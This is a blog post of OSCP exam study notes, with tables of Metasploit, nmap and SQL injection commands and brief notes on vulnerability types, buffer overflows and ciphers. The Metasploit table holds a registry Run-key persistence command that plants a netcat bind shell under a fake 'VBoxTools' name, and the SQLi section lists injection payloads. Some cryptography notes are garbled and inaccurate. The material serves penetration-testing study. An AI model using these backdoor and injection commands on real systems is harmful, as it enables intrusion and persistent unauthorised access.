---
categories:
  - blog
title: OSCP Notes
subtitle: Playbook for basic OSCP stuff
tags: [oscp, offensive]
comments: false
header:
  teaser: /img/oscp/oscp.jpg
---


# Introduction
A tabled summary of common commands used

# Metasploit

Command | Description
-------|--------
`Search Exploit <syntax>` | Search Payload|Exploit in metasploit
`Use exploit <name>` | use an exploit on metasploit
`Show Options` | shows exploit options
`Run` OR `Exploit` |
Show `Modules` OR `Payload` |
`Upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32` | Uploads the netcat executable from the local machine to the target
`Reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run` | Shows the registry key value
`Reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v VBoxTools -d 'C:\windows\system32\nc.exe -Ldp 455 -e cmd.exe ` | Sets a Registry Key Value
`Execute -f cmd -I H` | Execute a hidden cmd prompt
`Use auxillary/scanner/ssl/openssl_heartbleed` | Use heartbleed to dump memory
`Use auxillary/scanner/http/options` | Shows basic HTTP Methods

[*Back to table of contents*](#)

# nmap

Command | Description
-------|--------
`nmap -v -sS <Target>` | Basic Portscan of a target with a firewall
`nmap -v -sV  <Target>` | Fingerprints a target Verbose
`nmap -p 1-65535 192.168.168.0/25`| Scans a network for open ports in a range
`nmap -p 22 <target>` | Scans a single port
`nmap -F `target | Fast (Most common ports) scan 
`nmap -p-` target | Slow scans all ports
`nmap -sT` | TCP Conect Scan
`nmap -sS` | Syn Scan (Default)
`nmap -sU` | UDP Scan
`nmap -Pn -F` | Fast Scans a network with a standard ping, if there is no response then it goes to the next host
`nmap -A `| Detects OS and Service
`nmap -O `| Detects OS
`nmap -sV --script=smb* <target>` | Uses a script to scan the network, you can locate them by `locate nse | grep script` and print help by `--script-help=$scriptname `(Useful scripts http-title http-headers http-enum `ssl-heartbleed)

[*Back to table of contents*](#)

# SQLi
[![](https://img.youtube.com/vi/ciNHn38EyRc/maxresdefault.jpg)](https://youtu.be/ciNHn38EyRc)

Command | Description
-------|--------
**Select** field **from** table **where** var = 'Value';|
**Update** table **set** var = 'value'; | Value normally contain user input
`--` | Comment Delieter, everything after this will be ignored
`;`| Query Terminator
`*`| wildcard
`PG93 %` | matches any substring
`'` | quote Select field from table where var = 'Value''; (Should give you a nice neat little error)
`"` |quote
`'` OR `1=1`; | -- 1=1 is always true therefore the database should return some data
`'Fred' union select name,1,'1',1,'1' from master..sysdatabases;` | print the tables

## This will delete all the databases

`Select * from users where username = "Tom""; MALICIOUS CODE`
<http://www.unixwiz.net/techtips/sql-injection.html>
<https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/>

## Defence
If you are doing anything in web programming you should be using something called prepared statements

`Select  from users where username = ?` Or Sanitising  Inputs

<http://cwe.mitre.org/top25/#CWE-89>
<https://en.wikipedia.org/wiki/Prepared_statement>
<https://en.wikipedia.org/wiki/SQL_injection#Mitigation>
<https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29>

[*Back to table of contents*](#)

# Programming vulnerabilities

## References

GDB Cheat sheet <https://www.sthu.org/code/codesnippets/files/gdb_cheatsheet.pdf>
Format string vulnerabilities <https://crypto.stanford.edu/cs155old/cs155-spring06/formatstring-1.2.pdf>
Smashing the Stack  <http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf>
Layout of memory in a C program <https://www.geeksforgeeks.org/memory-layout-of-c-program/>

There are two types of software security flaws these are called Design flaws or Implementation Flaws

## Design Flaws

- Inherent to the actual design of the software (Could be deliberate or an oversight)
- This could be as simple as input validation, something that’s pseudo random (Pseudo being the key word, as the more random the code the more processing cycles that are required)
- A lot more difficult to change as its how the software is actually designed

## Implimentation Flaws

- Buffer flows due to missing or incorrect length checking
- Inappropriate checking or sanitation of untrusted user input
- Wrong or inappropriate runtime configuration
- Can be fixed with patches


The CVE (Common Vulnerabilities and Exposures) Database is the dictionary of commonly known software flaws or vulnerabilities

The CWE (Common Weakness Enumeration) Provide the unified, measurable set of software weaknesses.

The attack surface is the possible point of ingress into the system
These are documented as mechanisms, with UID's

CWE-s are distributed by people such as SANS, who actually document the most common ones. These can be introduced whenever adding or removing a feature. One mitigation may protect against several items.


## What is a Buffer Overflow

Something where we are accessing or writing to a piece of memory that we shouldn’t have access to. Typically this only affects low level applications like C, as modern languages abstract this. These can be a segmentation fault, that is shown on compile, often the program will crash, but an attacker can steal or corrupt data and run code of the attackers choice.

This is an issue because most Kernels, Embedded Systems, Drivers and servers are still written in C

# Cryptography

Entropy – Is the amount of randomness in the key

## Block Ciphers

- Uses Substitution (Lookup Tables)
- Uses Permutation (Reorder Bits)
- And
- Key (Bit selection or hash)
- In a series of rounds

## Stream Ciphers

- Takes tole message and runs it through as a whole block, the idea comes from OPT encryption
- Symmetric encryption created public key cryptography, which allows us to no have to exchange the private key to everyone they want to speak to (Diffie Helman EC) . However Its slower.